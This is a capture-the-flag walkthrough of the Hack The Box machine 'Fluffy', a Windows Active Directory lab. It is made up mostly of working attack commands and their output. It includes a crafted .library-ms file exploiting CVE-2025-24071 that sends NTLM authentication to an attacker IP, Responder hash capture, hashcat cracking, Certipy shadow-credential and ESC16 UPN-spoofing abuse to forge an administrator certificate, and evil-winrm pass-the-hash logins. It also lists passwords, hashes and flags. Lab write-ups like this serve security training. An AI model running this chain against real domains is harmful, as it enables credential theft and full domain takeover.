**By: Joshua Payne**


First, we got a default credential of:
**j.fleischman:J0elTHEM4n1990!**

We ran NMAP and got:

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 15:14 -0700
Nmap scan report for 10.129.232.88
Host is up (0.071s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        (generic dns response: SERVFAIL)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-13 05:17:14Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49729/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

While we ran:
```
nxc smb 10.129.232.0/24 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE      
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share
```

**Task 1: What is the Fully Qualified Domain Name (FQDN) of the Domain Controller in Certified?**
For this, we just looked at the NMAP scan and found:
```
DC01.fluffy.htb
```

**Task 2: What is the name of the PDF file in the SMB share?**
We looked inside the SMB Share and found the PDF, ```
```
Upgrade_Notice.pdf
```

**Task 3: From the list of CVEs mentioned in the PDF, which one allows an attacker leak an NTLM hash?**

We googled the CVEs listed:
![[Pasted image 20260512161311.png]]

And saw:
```
CVE-2025-24071
```

As the CVE for NTLM leakage.

**Task 4: What user is opening zip files in the IT share?**
We utilized that CVE and created a .library-ms to allow responder to catch the hash of another user, we made this file:
```
 <?xml version="1.0" encoding="UTF-8"?>
  <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
      <name>@windows.storage.dll,-34582</name>                                                                                        
      <version>6</version>
      <isLibraryPinned>true</isLibraryPinned>                                                                                         
      <iconReference>imageres.dll,-1003</iconReference>
      <templateInfo>                                                                                                                  
          <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
      </templateInfo>                                                                                                                 
      <searchConnectorDescriptionList>
          <searchConnectorDescription>                                                                                                
              <isDefaultSaveLocation>true</isDefaultSaveLocation>                                                                     
              <isSupported>false</isSupported>
              <simpleLocation>                                                                                                        
                  <url>\\10.10.15.109\share</url>
              </simpleLocation>                                                                              
          </searchConnectorDescription>
      </searchConnectorDescriptionList>                                                                                               
  </libraryDescription>
```

We named that file **bait.library-ms** then we zipped it, and put it onto the smb share. We also starting the Responder listener and got the username and password hash of p.agila who was opened the .zip.

```
p.agila
```

**Task 5: What is the p.agila user's password on Fluffy?**
We threw the hash into hashcat and got:
```
prometheusx-303
```

**Task 6: What ACE does the service account managers group has over the service accounts group?**

We then used bloodhound-python 
```
bloodhound-python -u p.agila -p 'prometheusx-303' -d fluffy.htb -ns 10.129.232.88 -c All
```
And looked at the output within Bloodhound-CE, searched for the **service account managers** group and look at outbound connections seeing the GenericAll ACE on service accounts
```
GenericAll
```



**Task 7: What ACE does the service accounts group has over the winrm_svc user?**

And looked at the output within Bloodhound-CE, searched for the **service accounts** group and look at outbound connections seeing the Generic Write ACE on winrm_svc
```
GenericWrite
```

From there, we saw that p.agila was a member of Service Account Managers so we used Certipy Shadow
```
certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'winrm_svc' -dc-ip 10.129.232.88 -dc-host 'dc01.fluffy.htb'
```

Getting this:
```
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'ce9eed4a176c4a6b96bf0cb22da91b4b'
[*] Adding Key Credential with device ID 'ce9eed4a176c4a6b96bf0cb22da91b4b' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'ce9eed4a176c4a6b96bf0cb22da91b4b' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

**Task 8: Submit the flag located on the winrm_svc user's desktop.**
From there we just used evil-winrm with PTH:
```
evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

Once we were in, we went to the desktop, and opened user.txt and got:
```
fcd474ce66b2129588db8ff787236a86
```

**Task 9: Which account can the Service Accounts group modify using its GenericWrite permission, and that account also belongs to the Cert Publishers group?**

Looked on Bloodhound-CE for what accounts **Service Accounts** writes to and one was the ca_svc account
```
ca_svc
```

**Task 10: What is the Common Name (CN) of the Certificate Authority (CA) that issues certificates in the Active Directory environment?**
Ran this command:
```
ertipy find -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.232.88 -dc-host 'dc01.fluffy.htb' -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3150FA7E60CE28AD4DAE41A1B61D8874
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:12:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
                                          FLUFFY.HTB\Administrators
        Read                            : FLUFFY.HTB\Administrators
Certificate Templates                   : [!] Could not find any certificate templates
```

Giving us the answer:
```
fluffy-DC01-CA
```

**Task 11: On Fluffy, the CA is misconfigured with security extensions disabled globally. What is the pseudo-name of the ESC vulnerability that this represents?**

Saw the disabled extension of: **1.3.6.1.4.1.311.25.2** which I googled and got
```
ESC16
```

**Task 12: Submit Root Flag**

First now that I knew we had access still to the CA_SVC which is the certificate authority and the securities are disabled meaning it falls back on using UPN instead of SID meaning we can just request a certificate in a different name. Which we set the UPN of ca_svc to 'administrator'
```
certipy account update -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.232.88 -user ca_svc -upn 'administrator'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Then requested a certificate
```
certipy req -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.232.88 -ca 'fluffy-DC01-CA' -template User -dc-host 'dc01.fluffy.htb'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 26
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Then changed our UPN back to normal
```
certipy account update -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.232.88 -user ca_svc -upn 'ca_svc@fluffy.htb'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

Then grabbed the NTLM hash for the administrator
```
certipy auth -pfx administrator.pfx -username administrator -domain fluffy.htb -dc-ip 10.129.232.88
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

And finally used evil-winrm again:
```
evil-winrm -i 10.129.232.88 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

To get the root.txt off the desktop:
```
a180b893eb4ce51800fb30467d335ae1
```
